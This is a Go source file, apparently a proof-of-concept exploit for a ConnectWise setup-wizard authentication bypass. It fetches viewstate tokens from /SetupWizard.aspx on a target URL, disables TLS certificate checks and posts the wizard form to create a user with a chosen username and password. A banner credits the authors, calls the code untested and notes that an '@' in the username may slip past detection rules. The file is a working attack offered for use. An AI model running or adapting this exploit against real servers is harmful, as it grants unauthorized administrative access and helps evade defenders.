package main

import (
	"fmt"
	"log"
  "flag"
  "strings"
	"regexp"
	"net/url"
	"net/http"
	"io/ioutil"
  "crypto/tls"
)

const banner = `			 __         ___  ___________
	 __  _  ______ _/  |__ ____ |  |_ \__    ____\____  _  ________
	 \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
	  \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
	   \/\/_/ (____  |__|  \___  |___|__|__  | \__  / \/\/_/  |__|
				  \/          \/     \/

        watchtowr-vs-ConnectWise_2024-02-21.go
          - Sonny, watchTowr (sonny@watchTowr.com)
          - Samuel Odhiambo Well GPT  (https://twitter.com/3lOr4cle)

          BEWARE:
          Theres a supress for a user input with an @ so a rule checking for that
          will probably not catch a user created by this unless it is checking for
          createion date. Or so I think.


          This has not been tested so it might fail after all input's are correct. `

func main() {
	urlPtr := flag.String("url", "", "target url in the format https://localhost")
	usernamePtr := flag.String("username", "", "username to add (You can add user in the form user@user.com)")
	passwordPtr := flag.String("password", "", "password to add (must be at least 8 characters in length)")
	flag.Parse()

	if *urlPtr == "" {
		fmt.Println(banner)
		flag.Usage()
		return
	}

	fmt.Println(banner)

	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	fmt.Printf("[*] Target Server: %s\n", *urlPtr)
	fmt.Printf("[*] Adding Username: %s\n", *usernamePtr)
	fmt.Printf("[*] Adding Password: %s\n", *passwordPtr)

	initialRequest, err := http.Get(*urlPtr + "/SetupWizard.aspx/")
	if err != nil {
		log.Fatal(err)
	}
	defer initialRequest.Body.Close()

	body, err := ioutil.ReadAll(initialRequest.Body)
	if err != nil {
		log.Fatal(err)
	}

	viewStateRegex := regexp.MustCompile(`value="([^"]+)"`)
	viewStateMatches := viewStateRegex.FindStringSubmatch(string(body))

	viewStateGenRegex := regexp.MustCompile(`VIEWSTATEGENERATOR" value="([^"]+)"`)
	viewStateGenMatches := viewStateGenRegex.FindStringSubmatch(string(body))

	viewState := viewStateMatches[1]
	viewStateGen := viewStateGenMatches[1]

	email := *usernamePtr
	if !strings.Contains(email, "@") {
		email += "@poc.com"
	}

	nextData := url.Values{
		"__EVENTTARGET":                    {""},
		"__EVENTARGUMENT":                  {""},
		"__VIEWSTATE":                      {viewState},
		"__VIEWSTATEGENERATOR":             {viewStateGen},
		"ctl00$Main$wizard$StartNavigationTemplateContainerID$StartNextButton": {"Next"},
	}

	nextRequest, err := http.PostForm(*urlPtr+"/SetupWizard.aspx/", nextData)
	if err != nil {
		log.Fatal(err)
	}
	defer nextRequest.Body.Close()

	nextBody, err := ioutil.ReadAll(nextRequest.Body)
	if err != nil {
		log.Fatal(err)
	}

	exploitViewState := viewStateRegex.FindStringSubmatch(string(nextBody))[1]
	exploitViewStateGen := viewStateGenRegex.FindStringSubmatch(string(nextBody))[1]

	exploitData := url.Values{
		"__LASTFOCUS":                                                 {""},
		"__EVENTTARGET":                                               {""},
		"__EVENTARGUMENT":                                             {""},
		"__VIEWSTATE":                                                 {exploitViewState},
		"__VIEWSTATEGENERATOR":                                        {exploitViewStateGen},
		"ctl00$Main$wizard$userNameBox":                               {*usernamePtr},
		"ctl00$Main$wizard$emailBox":                                  {email},
		"ctl00$Main$wizard$passwordBox":                               {*passwordPtr},
		"ctl00$Main$wizard$verifyPasswordBox":                         {*passwordPtr},
		"ctl00$Main$wizard$StepNavigationTemplateContainerID$StepNextButton": {"Next"},
	}

	exploitRequest, err := http.PostForm(*urlPtr+"/SetupWizard.aspx/", exploitData)
	if err != nil {
		log.Fatal(err)
	}
	exploitRequest.Body.Close()

	fmt.Println("[*] Successfully added user")
}
